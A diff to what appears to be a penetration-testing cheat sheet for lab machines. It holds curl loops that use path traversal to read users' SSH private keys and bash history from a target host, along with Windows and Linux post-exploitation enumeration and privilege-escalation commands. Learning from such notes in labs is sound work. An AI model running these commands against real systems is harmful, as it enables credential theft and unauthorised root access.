@@ -63,6 +63,9 @@ for i in {1000..5000}; do echo $i; curl -s "http://10.10.11.154/index.php?page=/
 while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.ssh/id_rsa"; done < users.txt
 while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.bash_history"; done < users.txt
 
+# processes
+ps auxwww
+
 # POST-EXPLOITATION Discovery 
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
 ipconfig /all
@@ -142,6 +145,17 @@ PRIVESC
 ```bash
 # Tools / Script
 https://www.securitysift.com/download/linuxprivchecker.py
+
+#Cron
+sudo -l
+crontab -l
+cat /etc/crontab
+
+#su sudo
+su root
+sudo su
+passwd root
+su
 
 #SUID BINARY
 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
